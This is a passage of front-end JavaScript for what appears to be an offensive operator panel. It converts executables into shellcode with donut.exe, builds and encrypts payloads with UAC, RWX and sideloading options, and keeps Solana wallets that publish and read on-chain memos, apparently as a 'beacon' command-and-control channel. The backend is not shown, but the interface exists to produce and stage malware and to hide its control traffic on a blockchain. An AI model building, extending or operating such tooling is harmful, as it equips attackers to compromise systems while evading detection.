      deleteEncryptHistory(j.id);
    });

    // ── wire copy memo ──
    el.querySelector(".btn-hist-copy")?.addEventListener("click", () => {
      const memo = el.dataset.memo;
      if (!memo) return;
      navigator.clipboard.writeText(memo).then(() => {
        const btn = el.querySelector(".btn-hist-copy");
        const orig = btn.textContent;
        btn.textContent = "Copied!";
        setTimeout(() => { btn.textContent = orig; }, 1800);
      }).catch(() => {});
    });

    // ── wire publish toggle (uses wallet already attached to this run) ──
    el.querySelector(".btn-hist-pub")?.addEventListener("click", () => {
      const panel = el.querySelector(".hist-pub-panel");
      panel.classList.toggle("hidden");
    });

    // ── publish button: use j.wallet_id directly — no wallet picker needed ──
    el.querySelector(".hist-pub-btn")?.addEventListener("click", async () => {
      const panel = el.querySelector(".hist-pub-panel");
      const out   = panel.querySelector(".hist-pub-out");
      const rpc   = panel.querySelector(".hist-pub-rpc").value.trim();
      const memo  = el.dataset.memo;
      const wid   = j.wallet_id;

      if (!memo) { out.textContent = "[-] No memo stored."; out.className = "hist-pub-out bad"; return; }
      if (!wid)  { out.textContent = "[-] Wallet not in workspace (manual address used)."; out.className = "hist-pub-out bad"; return; }

      const btn = el.querySelector(".hist-pub-btn");
      btn.disabled = true; btn.textContent = "Publishing…";
      out.textContent = "> broadcasting …";
      out.className   = "hist-pub-out";

      try {
        const r = await fetch(`/api/wallets/${wid}/publish`, {
          method: "POST", headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ memo, rpc_url: rpc }),
        });
        const jr = await r.json();
        if (jr.ok) {
          out.textContent = `[+] Sent!  Sig: ${jr.signature}\nhttps://solscan.io/tx/${jr.signature}`;
          out.className   = "hist-pub-out ok";
        } else {
          out.textContent = `[-] ${jr.error || jr.stderr || "Failed"}`;
          out.className   = "hist-pub-out bad";
        }
      } catch (err) {
        out.textContent = `[network error] ${err}`;
        out.className   = "hist-pub-out bad";
      } finally {
        btn.disabled = false; btn.textContent = "Publish on-chain";
      }
    });
  }
}

async function deleteEncryptHistory(id) {
  if (!confirm(`Delete encrypt run #${id} and all its artifacts?`)) return;
  await fetch(`/api/encrypt/history/${id}`, { method: "DELETE" });
  refreshEncryptHistory();
}

$("#btn-refresh-encrypt-hist").addEventListener("click", refreshEncryptHistory);

// ─── build history ────────────────────────────────────────────────────────

let _buildHistory = [];

async function refreshBuildHistory() {
  try { _buildHistory = await fetch("/api/build/history").then(r => r.json()); }
  catch (_) { _buildHistory = []; }
  renderBuildHistory();
  refreshArtifacts();
}

function renderBuildHistory() {
  const list  = $("#build-history-list");
  const empty = $("#build-hist-empty");
  list.querySelectorAll(".hist-item").forEach(el => el.remove());

  if (!_buildHistory.length) { empty.style.display = ""; return; }
  empty.style.display = "none";

  for (const j of _buildHistory) {
    const el = document.createElement("div");
    el.className = "hist-item";
    const dot     = j.ok ? `<span class="ji-dot dot-ok">●</span>` : `<span class="ji-dot dot-bad">○</span>`;
    const dateStr = fmtTimeShort(j.created_at);
    const flags   = [j.mode, j.uac ? "uac" : "", j.rwx ? "rwx" : "", j.debug ? "dbg" : "", j.synthetic ? "syn" : ""]
                      .filter(Boolean).join(" · ");

    let dls = `<a class="btn-xs" href="/api/build/history/${j.id}/download/output" title="Download build log">↓ log</a>`;
    if (j.zip_size > 0)
      dls += ` <a class="btn-xs primary" href="/api/build/history/${j.id}/download/zip" title="Download deployment ZIP">↓ ${j.zip_name}</a>`;
    else if (j.binary_size > 0)
      dls += ` <a class="btn-xs primary" href="/api/build/history/${j.id}/download/binary" title="Download ${j.binary_name}">↓ ${j.binary_name}</a>`;

    el.innerHTML = `
      <div class="hist-head">
        ${dot}
        <span class="hist-name">${j.binary_name || "—"}</span>
        <button class="btn-xs btn-danger hist-del" data-hid="${j.id}" title="Delete">✕</button>
      </div>
      <div class="hist-meta">
        <span class="ji-id">#${j.id}</span>
        <span>${flags}</span>
        <span>${j.binary_size ? fmtSize(j.binary_size) : ""}</span>
        <span>${dateStr}</span>
      </div>
      <div class="hist-dls">${dls}</div>`;
    list.appendChild(el);

    el.querySelector(".hist-del").addEventListener("click", (ev) => {
      ev.stopPropagation();
      deleteBuildHistory(j.id);
    });
  }
}

async function deleteBuildHistory(id) {
  if (!confirm(`Delete build #${id} and all its artifacts?`)) return;
  await fetch(`/api/build/history/${id}`, { method: "DELETE" });
  refreshBuildHistory();
}

$("#btn-refresh-build-hist").addEventListener("click", refreshBuildHistory);

// ─── donut ────────────────────────────────────────────────────────────────

let _donutJobs = [];

async function refreshDonutJobs() {
  try { _donutJobs = await fetch("/api/donut/jobs").then(r => r.json()); }
  catch (_) { _donutJobs = []; }
  renderDonutJobs();
}

function renderDonutJobs() {
  const hist  = $("#donut-history");
  const empty = $("#donut-empty");
  hist.querySelectorAll(".job-item").forEach(el => el.remove());

  if (!_donutJobs.length) { empty.style.display = ""; return; }
  empty.style.display = "none";

  for (const j of _donutJobs) {
    const el = document.createElement("div");
    el.className = "job-item";
    const statusDot = j.ok ? "●" : "○";
    const statusCls = j.ok ? "dot-ok" : "dot-bad";
    el.innerHTML = `
      <div class="ji-head">
        <span class="ji-dot ${statusCls}">${statusDot}</span>
        <span class="ji-name">${j.original_name}</span>
        <button class="btn-xs btn-danger ji-del" data-jid="${j.id}" title="Delete">✕</button>
      </div>
      <div class="ji-meta">
        <span class="ji-id">#${j.id}</span>
        <span>${j.arch_label}</span>
        ${j.size_in  ? `<span>${fmtSize(j.size_in)} in</span>` : ""}
        ${j.size_out ? `<span>→ ${fmtSize(j.size_out)}</span>` : ""}
      </div>
      <div class="ji-date">${fmtTimeShort(j.created_at)}</div>
      ${j.ok ? `
      <div class="ji-dls">
        <a class="btn-xs" href="/api/donut/jobs/${j.id}/download/original">↓ orig</a>
        <a class="btn-xs primary" href="/api/donut/jobs/${j.id}/download/shellcode">↓ shellcode</a>
      </div>` : ""}`;
    hist.insertBefore(el, hist.firstChild);
    el.querySelector(".ji-del")?.addEventListener("click", (ev) => {
      ev.stopPropagation();
      deleteDonutJob(j.id);
    });
  }
}

async function deleteDonutJob(id) {
  if (!confirm(`Delete job #${id} and its files?`)) return;
  await fetch(`/api/donut/jobs/${id}`, { method: "DELETE" });
  refreshDonutJobs();
}

$("#form-donut").addEventListener("submit", async (e) => {
  e.preventDefault();
  const out    = $("#out-donut");
  const result = $("#donut-result");
  result.classList.add("hidden"); result.innerHTML = "";
  writeConsole(out, "> running donut.exe …\n", { reset: true });
  const btn = $("button.primary", e.target);
  btn.disabled = true; btn.textContent = "Converting…";
  try {
    const r = await fetch("/api/donut", { method: "POST", body: new FormData(e.target) });
    const j = await r.json();
    if (j.stdout) writeConsole(out, j.stdout);
    if (j.stderr) writeConsole(out, j.stderr);
    writeConsole(out, `\n[exit ${j.code ?? (j.ok ? 0 : -1)}]\n`, { ok: j.ok });
    if (j.ok && j.job) {
      result.innerHTML = `
        <a class="dl-link" href="/api/donut/jobs/${j.job.id}/download/shellcode">
          ⬇ shellcode_${j.job.id}.bin (${fmtSize(j.job.size_out)})
        </a>`;
      result.classList.remove("hidden");
      refreshDonutJobs();
      // Update encrypt dropdown if build page is in view
      refreshEncryptDropdowns();
    }
  } catch (err) { writeConsole(out, `[network error] ${err}\n`, { ok: false }); }
  finally { btn.disabled = false; btn.textContent = "Convert"; }
});

// ─── wallets ──────────────────────────────────────────────────────────────

let _wallets = [];
let _selWalletId = null;

async function refreshWallets() {
  try { _wallets = await fetch("/api/wallets").then(r => r.json()); }
  catch (_) { _wallets = []; }
  renderWallets();
  if (_selWalletId && !_wallets.find(w => w.id === _selWalletId)) {
    _selWalletId = null;
    showWalletPanel(null);
  }
  // Also refresh encrypt dropdowns (wallets may have changed)
  refreshEncryptDropdowns();
}

function renderWallets() {
  const list  = $("#wallet-list");
  const empty = $("#wallet-empty");
  list.querySelectorAll(".wallet-item").forEach(el => el.remove());

  if (!_wallets.length) { empty.style.display = ""; return; }
  empty.style.display = "none";

  for (const w of _wallets) {
    const el = document.createElement("div");
    el.className = "wallet-item" + (w.id === _selWalletId ? " selected" : "");
    el.dataset.wid = w.id;
    el.innerHTML = `
      <div class="wi-name">${w.name}</div>
      <div class="wi-addr">${trunc(w.address, 28)}</div>
      <div class="wi-date">${fmtTimeShort(w.created_at)}</div>`;
    el.addEventListener("click", () => selectWallet(w.id));
    list.appendChild(el);
  }
}

function selectWallet(id) {
  _selWalletId = id;
  renderWallets();
  showWalletPanel(_wallets.find(w => w.id === id) || null);
}

function showWalletPanel(w) {
  const panel = $("#wallet-panel");
  const none  = $("#wallet-none");
  if (!w) {
    panel.classList.add("hidden"); none.classList.remove("hidden"); return;
  }
  none.classList.add("hidden"); panel.classList.remove("hidden");
  $("#wp-name").textContent = w.name;
  $("#wp-addr").textContent = w.address;
  $("#btn-wallet-dl-kp").href = `/api/wallets/${w.id}/keypair`;
  // clear outputs
  [$("#out-publish"), $("#out-lookup")].forEach(el => {
    el.textContent = ""; el.classList.remove("ok", "bad");
  });
  $("#wallet-rename-row").classList.add("hidden");
}

// copy address
$("#btn-copy-addr").addEventListener("click", async () => {
  const addr = $("#wp-addr").textContent.trim();
  if (!addr) return;
  try {
    await navigator.clipboard.writeText(addr);
    const btn = $("#btn-copy-addr");
    btn.textContent = "Copied!";
    setTimeout(() => { btn.textContent = "Copy"; }, 1800);
  } catch {
    const sel = window.getSelection(), range = document.createRange();
    range.selectNodeContents($("#wp-addr"));
    sel.removeAllRanges(); sel.addRange(range);
  }
});

// create wallet
$("#btn-create-wallet").addEventListener("click", async () => {
  const name = $("#new-wallet-name").value.trim() || "Wallet";
  const btn  = $("#btn-create-wallet");
  btn.disabled = true; btn.textContent = "Creating…";
  try {
    const r = await fetch("/api/wallets", {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ name }),
    });
    const j = await r.json();
    if (j.ok) {
      $("#new-wallet-name").value = "";
      await refreshWallets();
      selectWallet(j.wallet.id);
    } else {
      alert("Create failed: " + (j.stderr || j.error || "unknown"));
    }
  } catch (err) { alert(`Network error: ${err}`); }
  finally { btn.disabled = false; btn.textContent = "+ Create"; }
});

// rename
$("#btn-wallet-rename").addEventListener("click", () => {
  const row = $("#wallet-rename-row");
  row.classList.toggle("hidden");
  if (!row.classList.contains("hidden")) {
    const w = _wallets.find(x => x.id === _selWalletId);
    $("#wallet-rename-input").value = w?.name || "";
    $("#wallet-rename-input").focus();
  }
});
$("#btn-cancel-rename").addEventListener("click", () =>
  $("#wallet-rename-row").classList.add("hidden"));
$("#btn-confirm-rename").addEventListener("click", async () => {
  if (!_selWalletId) return;
  const name = $("#wallet-rename-input").value.trim();
  if (!name) return;
  await fetch(`/api/wallets/${_selWalletId}`, {
    method: "PUT", headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ name }),
  });
  $("#wallet-rename-row").classList.add("hidden");
  await refreshWallets();
  selectWallet(_selWalletId);
});

// delete
$("#btn-wallet-delete").addEventListener("click", async () => {
  if (!_selWalletId) return;
  const w = _wallets.find(x => x.id === _selWalletId);
  if (!confirm(`Delete wallet "${w?.name}"?\nThe keypair stored on this server will be permanently erased.`)) return;
  await fetch(`/api/wallets/${_selWalletId}`, { method: "DELETE" });
  _selWalletId = null;
  showWalletPanel(null);
  refreshWallets();
});

// publish
$("#form-publish").addEventListener("submit", async (e) => {
  e.preventDefault();
  if (!_selWalletId) return;
  const out = $("#out-publish");
  writeConsole(out, "> broadcasting memo …\n", { reset: true });
  const btn = $("button.primary", e.target);
  btn.disabled = true; btn.textContent = "Publishing…";
  try {
    const r = await fetch(`/api/wallets/${_selWalletId}/publish`, {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        memo:    $("#wp-memo").value.trim(),
        rpc_url: $("#wp-rpc").value.trim(),
      }),
    });
    const j = await r.json();
    if (j.ok) {
      writeConsole(out,
        `[+] Sent!\n    Sig: ${j.signature}\n    https://solscan.io/tx/${j.signature}\n`,
        { ok: true });
    } else {
      writeConsole(out, `[-] ${j.error || j.stderr || "Failed"}\n`, { ok: false });
    }
  } catch (err) { writeConsole(out, `[network error] ${err}\n`, { ok: false }); }
  finally { btn.disabled = false; btn.textContent = "Publish on-chain"; }
});

// lookup — two modes
async function doLookup(mode) {
  if (!_selWalletId) return;
  const out = $("#out-lookup");
  const label = mode === "beacon" ? "beacon (oldest) memo" : "latest memo";
  writeConsole(out, `> looking up ${label} …\n`, { reset: true });
  const btnLatest = $("#btn-lookup-latest");
  const btnBeacon = $("#btn-lookup-beacon");
  btnLatest.disabled = btnBeacon.disabled = true;
  try {
    const r = await fetch(`/api/wallets/${_selWalletId}/lookup`, {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        rpc_url: $("#wp-rpc").value.trim(),
        mode,
      }),
    });
    const j = await r.json();
    if (j.found) {
      writeConsole(out,
        `[+] Memo found (scanned ${j.scanned ?? "?"} tx)\n    Sig: ${j.signature}\n\n${j.memo}\n`,
        { ok: true });
    } else if (j.error) {
      writeConsole(out, `[-] ${j.error}\n`, { ok: false });
    } else {
      writeConsole(out, `[-] No memo found (scanned ${j.scanned ?? "?"} tx).\n`);
    }
  } catch (err) { writeConsole(out, `[network error] ${err}\n`, { ok: false }); }
  finally { btnLatest.disabled = btnBeacon.disabled = false; }
}

$("#btn-lookup-latest").addEventListener("click", () => doLookup("latest"));
$("#btn-lookup-beacon").addEventListener("click", () => doLookup("beacon"));

// ─── boot ─────────────────────────────────────────────────────────────────

refreshStatus();
refreshProfiles();
refreshEncryptDropdowns();
refreshSideloadAssets();   // loads _dlls/_exes and populates selectors
refreshEncryptHistory();
refreshBuildHistory();
